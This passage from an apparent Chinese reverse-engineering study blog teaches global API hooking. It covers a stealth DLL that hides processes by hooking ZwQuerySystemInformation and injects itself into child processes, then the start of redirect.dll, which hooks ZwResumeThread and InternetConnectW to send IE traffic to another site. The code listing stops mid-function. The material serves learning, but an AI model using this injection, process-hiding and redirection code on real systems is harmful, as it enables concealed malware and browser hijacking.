lpEnvironment,</span><br><span class="line">                                     lpCurrentDirectory,</span><br><span class="line">                                     lpStartupInfo,</span><br><span class="line">                                     lpProcessInformation);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向生成的子进程注入 stealth3.dll</span></span><br><span class="line">    <span class="keyword">if</span>( bRet )</span><br><span class="line">        <span class="built_in">InjectDll2</span>(lpProcessInformation-&gt;hProcess, STR_MODULE_NAME);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span>            szCurProc[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    <span class="type">char</span>            *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 异常处理使注入不会发生在HideProc2.exe进程</span></span><br><span class="line">    <span class="built_in">GetModuleFileNameA</span>(<span class="literal">NULL</span>, szCurProc, MAX_PATH);</span><br><span class="line">    p = <span class="built_in">strrchr</span>(szCurProc, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>( (p != <span class="literal">NULL</span>) &amp;&amp; !_stricmp(p+<span class="number">1</span>, <span class="string">&quot;HideProc2.exe&quot;</span>) )</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change privilege</span></span><br><span class="line">    <span class="built_in">SetPrivilege</span>(SE_DEBUG_NAME, TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>( fdwReason )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH : </span><br><span class="line">            <span class="comment">// hook</span></span><br><span class="line">            <span class="built_in">hook_by_hotpatch</span>(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;CreateProcessA&quot;</span>, (PROC)NewCreateProcessA);</span><br><span class="line">            <span class="built_in">hook_by_hotpatch</span>(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;CreateProcessW&quot;</span>, (PROC)NewCreateProcessW);</span><br><span class="line">            <span class="built_in">hook_by_code</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>, (PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH :</span><br><span class="line">            <span class="comment">// unhook</span></span><br><span class="line">            <span class="built_in">unhook_by_hotpatch</span>(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;CreateProcessA&quot;</span>);</span><br><span class="line">            <span class="built_in">unhook_by_hotpatch</span>(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;CreateProcessW&quot;</span>);</span><br><span class="line">            <span class="built_in">unhook_by_code</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>, g_pOrgZwQSI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>&emsp;<strong>热补丁要求被钩取的API要有<code>NOP*5 + MOV EDI, EDI</code>，因此，并非所有API都能使用热补丁。</strong>例如，<code>ntdll.dll</code>的API代码都很短，且不满足热补丁条件。<strong>进行<code>ntdll.dll</code> API代码钩取时，先将原 API备份到用户内存区域，然后使用<code>5字节代码修改技术</code>修改原API的起始部分。在用户钩取函数内部调用原API时，只需调用备份的 API即可，这样实现的 API钩取既简单又稳定。</strong></p>
<h2 id="0x05-高级全局API钩取：IE连接控制"><a href="#0x05-高级全局API钩取：IE连接控制" class="headerlink" title="0x05 高级全局API钩取：IE连接控制"></a>0x05 高级全局API钩取：IE连接控制</h2><p>&emsp;本节中钩取IE浏览器，当IE连接指定网站时转而连接我的博客。（可以当作拦截恶意网页，当用户访问恶意网页时，转到其他的网页。）常见的与网络连接相关的库有：（1）<code>ws2_32.dll</code>（套接字库）；（2）<code>wininet.dll</code>、<code>winhttp.dll</code>（网络访问相关的库）；</p>
<p>&emsp;通过<code>Process Explorer</code>可以看到，IE加载了<code>ws2_32.dll</code>与<code>wininet.dll</code>。其中<code>wininet.dll</code>中有一个<code>IntermetConnect</code>的API，其用来连接某个网站。此API介绍如下：</p>
<p><img src="/images/re-core-principle-3/image-20230416110102050.png" alt="image-20230416110102050" style="zoom:60%;" /></p>
<p>&emsp;<strong>其中，34.1的实验并未成功，思考应该是盗版win7的原因。但是换了正版win7还是不行。</strong></p>
<p>&emsp;IE浏览器的每一个选项卡tab都是一个进程，当开启一个新的网页时，都会创建一个新的进程。因此，要实现全局钩取，否则新开网页的时候就不会达到我们的目的。之前，我们介绍了，要用全局钩取，有两种办法：（1）钩取<code>CreateProcessA</code>、<code>CreateProcessW</code>、<code>ZwQuerySystemInformation</code>。（2）钩取<code>ZwResumeThread</code>（不公开的API）。本节中使用方法（2），即，钩取<code>ntdll!
ZwResumeThread</code>，创建进程之后，主线程被<code>Resume</code>（恢复运行）时，可以钩取目标API。</p>
<p>&emsp;常规API钩取与全局API钩取，图示如下：</p>
<p><img src="/images/re-core-principle-3/image-20230416145007024.png" alt="image-20230416145007024" style="zoom:50%;" /></p>
<p><img src="/images/re-core-principle-3/image-20230416145033185.png" alt="image-20230416145033185" style="zoom:50%;" /></p>
<p>&emsp;<code>Explorer.exe</code>是<code>Windows</code>操作系统的基本shell，可以创建子进程。</p>
<p>&emsp;当使用<code>CreateProcessW</code>创建进程时<strong>（钩取任何一个都能实现全局API钩取）</strong>，其调用流程如下：</p>
<p><img src="/images/re-core-principle-3/image-20230416152219588.png" alt="image-20230416152219588" style="zoom:67%;" /></p>
<p>&emsp;那么，如果我们钩取<code>ntdll!ZwResumeThread</code>，就可以在子进程的EP代码运行之前，拦截获取控制权。<code>ntdll!ZwResumeThread</code>的定义如下：（<code>ntdll!ZwResumeThread</code>=<code>ntdll!NtResumeThread</code>）</p>
<p><img src="/images/re-core-principle-3/image-20230416152529827.png" alt="image-20230416152529827" style="zoom:67%;" /></p>
<h3 id="练习示例"><a href="#练习示例" class="headerlink" title="练习示例"></a>练习示例</h3><p>&emsp;向目标进程注入<code>redirect.dll</code>来实现API钩取，<code>redirect.dll</code>钩取下面2个API：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wininet!InternetConnectW: 可以控制IE进程的连接地址</span><br><span class="line">ntdll!ZwResumeThread: 实现全局API钩取</span><br></pre></td></tr></table></figure>
<p>&emsp;由于IE进程以父子进程的形式运行，只要钩取父进程的<code>ntdll!ZwResumeThread</code> API，那么后面生成的所有子IE进程都会自动钩取。<strong>实现的效果是，使用<code>InjDll.exe</code>，向IE进程<code>iexplore.exe</code>中注入<code>redirect.dll</code>。此后，打开IE浏览器，访问<code>www.naver.com</code>、<code>www.daum.net</code>、<code>wwwnate.com</code>、<code>www.yahoo.com</code>时，会直接访问<code>www.ReverseCore.com</code>。</strong>（上述34.1的实验不成功，但是这个代码却可以正常运行。）</p>
<p>&emsp;相应代码&amp;注释如下：（<code>InjDll.exe</code>与之前的代码类似，不做赘述。）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// redirect.cpp -&gt; redirect.dll</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;wininet.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_MODULE_NAME					    (<span class="string">L&quot;redirect.dll&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_SUCCESS						(0x00000000L) </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> LONG NTSTATUS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CLIENT_ID</span> &#123;</span><br><span class="line">	HANDLE UniqueProcess;</span><br><span class="line">	HANDLE UniqueThread;</span><br><span class="line">&#125; CLIENT_ID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_THREAD_BASIC_INFORMATION</span> &#123;</span><br><span class="line">	NTSTATUS ExitStatus;</span><br><span class="line">	PVOID TebBaseAddress;</span><br><span class="line">	CLIENT_ID ClientId;</span><br><span class="line">	ULONG AffinityMask;</span><br><span class="line">	LONG Priority;</span><br><span class="line">	LONG BasePriority;</span><br><span class="line">&#125; THREAD_BASIC_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(WINAPI *PFZWRESUMETHREAD)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ThreadHandle, </span></span></span><br><span class="line"><span class="params"><span class="function">    PULONG SuspendCount</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(WINAPI *PFZWQUERYINFORMATIONTHREAD)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ThreadHandle, </span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG ThreadInformationClass, </span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID ThreadInformation, </span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG ThreadInformationLength, </span></span></span><br><span class="line"><span class="params"><span class="function">    PULONG ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HINTERNET</span> <span class="params">(WINAPI *PFINTERNETCONNECTW)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HINTERNET hInternet,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCWSTR lpszServerName,</span></span></span><br><span class="line"><span class="params"><span class="function">    INTERNET_PORT nServerPort,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpszUsername,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpszPassword,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwService,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD_PTR dwContext</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line">BYTE g_pZWRT[<span class="number">5</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">BYTE g_pICW[<span class="number">5</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DebugLog</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	va_list vl;</span><br><span class="line">	FILE *pf = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">char</span> szLog[<span class="number">512</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">va_start</span>(vl, format);</span><br><span class="line">	<span class="built_in">wsprintfA</span>(szLog, format, vl);</span><br><span class="line">	<span class="built_in">va_end</span>(vl);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">OutputDebugStringA</span>(szLog);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(),</span><br><span class="line">                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, </span><br><span class="line">			              &amp;hToken) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;OpenProcessToken error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>,             <span class="comment">// lookup privilege on local system</span></span><br><span class="line">                              lpszPrivilege,    <span class="comment">// privilege to lookup </span></span><br><span class="line">                              &amp;luid) )          <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;LookupPrivilegeValue error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span>( bEnablePrivilege )</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">AdjustTokenPrivileges</span>(hToken, </span><br><span class="line">                               FALSE, </span><br><span class="line">                               &amp;tp, </span><br><span class="line">                               <span class="built_in">sizeof</span>(TOKEN_PRIVILEGES), </span><br><span class="line">                               (PTOKEN_PRIVILEGES) <span class="literal">NULL</span>, </span><br><span class="line">                               (PDWORD) <span class="literal">NULL</span>) )</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">GetLastError</span>() == ERROR_NOT_ALL_ASSIGNED )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DebugLog</span>(<span class="string">&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	使用5字节修改技术钩取 API。</span></span><br><span class="line"><span class="comment">	因为钩取ntdll.ZwResumeThread只能使用5字节修改技术(由于没有足够的空间，所以无法使用7字节修改技术)。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">BOOL <span class="title">hook_by_code</span><span class="params">(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FARPROC pFunc = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwOldProtect = <span class="number">0</span>, dwAddress = <span class="number">0</span>;</span><br><span class="line">	BYTE pBuf[<span class="number">5</span>] = &#123;<span class="number">0xE9</span>, <span class="number">0</span>, &#125;;</span><br><span class="line">	PBYTE pByte = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    hMod = <span class="built_in">GetModuleHandleA</span>(szDllName);</span><br><span class="line">    <span class="keyword">if</span>( hMod == <span class="literal">NULL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        